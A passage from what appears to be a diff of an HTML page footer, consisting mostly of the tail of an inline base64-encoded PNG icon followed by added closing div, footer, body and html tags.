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"></a></li>
+		</div>
+
+		</footer>
+	</body>	
 </html>
 
 
